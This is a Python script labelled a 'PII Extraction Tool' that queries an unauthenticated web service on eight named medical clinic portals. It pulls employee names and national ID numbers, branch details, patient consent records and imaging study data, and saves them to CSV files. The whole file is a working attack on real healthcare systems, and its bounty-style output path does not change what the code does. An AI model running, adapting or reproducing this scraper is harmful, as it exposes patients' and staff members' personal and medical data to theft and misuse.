#!/usr/bin/env python3
"""
CMR/EMESALUD — PII Extraction Tool
Extrae empleados, pacientes, sucursales, estudios y consentimientos
de todos los hosts WCF sin autenticación.
"""
import requests, json, csv, os, time
from datetime import datetime

requests.packages.urllib3.disable_warnings()

HOSTS = {
    "corominas": "https://portal.clinicacorominas.com.do",
    "abreu": "https://resultados.clinicaabreu.com.do",
    "cedisa": "https://portalresultados.cedisa.do",
    "cmm": "https://resultadosimagenes.cmm.do",
    "cardio": "https://cardioimagenes.cmr-apps.com",
    "cadi": "https://portal.cadi.do",
    "policlinica": "https://www.policlinicametropolitana-apps.com",
    "emesalud": "http://www.cmr-apps.com",
}

BASE = "/HisWebServicios/Portal/ServicioPortal.svc"
OUT = "/root/bounty/pii_extractions"
os.makedirs(OUT, exist_ok=True)

def call(host, method, params=None):
    url = f"{host}{BASE}/{method}"
    headers = {"Content-Type": "application/json; charset=utf-8"}
    data = json.dumps(params) if params else "{}"
    try:
        r = requests.post(url, data=data, headers=headers, timeout=20, verify=False)
        if r.status_code == 200 and len(r.text) > 10:
            return r.text
    except Exception as e:
        return f"ERROR: {e}"
    return None

def extract_json_blob(text):
    """Extract the inner JSON string from WCF wrapper"""
    try:
        parsed = json.loads(text)
        # Find the first key ending with Result
        for k, v in parsed.items():
            if k.endswith('Result'):
                inner = json.loads(v)
                return inner
    except:
        pass
    return None

def extract_personal_recuperar(host, name):
    """Extract ALL employees by searching alphabet"""
    print(f"\n📋 {name}: Extrayendo PersonalRecuperar...")
    all_employees = []
    seen_ids = set()
    
    # Search with empty string catches many
    for search in ["", "a", "e", "i", "o", "u", "m", "p", "r", "s", "c", "j", "d", "l"]:
        resp = call(host, "PersonalRecuperar", {"sBuscar": search})
        if not resp:
            continue
        inner = extract_json_blob(resp)
        if not inner:
            continue
        data = inner.get('data', inner.get('Data', []))
        if isinstance(data, list):
            for emp in data:
                eid = emp.get('IdPersonal', emp.get('idPersonal', 0))
                if eid not in seen_ids:
                    seen_ids.add(eid)
                    all_employees.append(emp)
        time.sleep(0.3)
    
    # Save to CSV
    if all_employees:
        csv_path = f"{OUT}/{name}_empleados.csv"
        with open(csv_path, 'w', newline='', encoding='utf-8') as f:
            fieldnames = ['IdPersonal', 'Nombre', 'Cedula', 'Rol', 'Especialidad', 'Estado']
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            for emp in all_employees:
                writer.writerow({
                    'IdPersonal': emp.get('IdPersonal', emp.get('idPersonal', '')),
                    'Nombre': emp.get('Nombre', emp.get('nombre', '')),
                    'Cedula': emp.get('Cedula', emp.get('cedula', '')),
                    'Rol': emp.get('Rol', emp.get('rol', '')),
                    'Especialidad': emp.get('Especialidad', emp.get('especialidad', '')),
                    'Estado': emp.get('Estado', emp.get('estado', '')),
                })
        print(f"  ✅ {len(all_employees)} empleados → {csv_path}")
        
        # Show summary
        roles = {}
        for e in all_employees:
            r = e.get('Rol', e.get('rol', '?'))
            roles[r] = roles.get(r, 0) + 1
        print(f"  Roles: {roles}")
        
        # Show sample with cedulas
        con_cedula = [e for e in all_employees if e.get('Cedula', e.get('cedula','')) not in ['','ADMIN','0000','?']]
        print(f"  Con cédula válida: {len(con_cedula)}/{len(all_employees)}")
        for e in con_cedula[:5]:
            name_e = e.get('Nombre', e.get('nombre','?'))
            ced = e.get('Cedula', e.get('cedula','?'))
            rol = e.get('Rol', e.get('rol','?'))
            print(f"    👤 {name_e[:40]} | Cédula: {ced} | {rol}")
    
    return all_employees

def extract_sucursales(host, name):
    """Extract branches"""
    resp = call(host, "GetSucursales")
    if not resp:
        return
    inner = extract_json_blob(resp)
    if inner and isinstance(inner, list):
        csv_path = f"{OUT}/{name}_sucursales.csv"
        with open(csv_path, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=['Nombre', 'Telefono', 'Direccion', 'EsPrincipal'])
            writer.writeheader()
            for s in inner:
                writer.writerow({
                    'Nombre': s.get('Nombre', s.get('nombre', '')),
                    'Telefono': s.get('Telefono', s.get('telefono', '')),
                    'Direccion': s.get('Direccion', s.get('direccion', '')),
                    'EsPrincipal': s.get('EsPrincipal', s.get('esPrincipal', '')),
                })
        print(f"  🏪 {len(inner)} sucursales → {csv_path}")

def extract_homepage(host, name):
    """Extract HomePageData (study counts)"""
    resp = call(host, "HomePageData")
    if resp:
        inner = extract_json_blob(resp)
        if inner:
            print(f"  📊 Estudios: Imagen={inner.get('EstudiosImagenCount',0)} "
                  f"Pato={inner.get('EstudiosPatoCount',0)} "
                  f"Labo={inner.get('EstudiosLaboCount',0)} "
                  f"Folio={inner.get('Folio','N/A')}")

def extract_consentimientos(host, name):
    """Extract patient consents"""
    resp = call(host, "GetConsentimientosLista")
    if resp:
        inner = extract_json_blob(resp)
        if inner:
            results = inner.get('Result', inner.get('result', []))
            if results:
                csv_path = f"{OUT}/{name}_consentimientos.csv"
                with open(csv_path, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=list(results[0].keys()) if results else [])
                    writer.writeheader()
                    for row in results:
                        writer.writerow(row)
                print(f"  📄 {len(results)} consentimientos → {csv_path}")

# ====== MAIN ======
print(f"🔍 CMR PII Extraction — {datetime.now().isoformat()}")
print(f"Hosts: {len(HOSTS)}")

for name, host in HOSTS.items():
    print(f"\n{'='*60}")
    print(f"  {name.upper()} — {host}")
    print(f"{'='*60}")
    
    extract_homepage(host, name)
    extract_sucursales(host, name)
    extract_consentimientos(host, name)
    extract_personal_recuperar(host, name)
    
    # Also try ImagingAnalysisList with different folio values
    for folio in [0, 1]:
        resp = call(host, "ImagingAnalysisList", {"iIdFolio": folio})
        if resp:
            inner = extract_json_blob(resp)
            if inner:
                print(f"  🔬 ImagingAnalysisList(folio={folio}): {str(inner)[:200]}")

print(f"\n✅ EXTRACCIÓN COMPLETA — Resultados en {OUT}/")
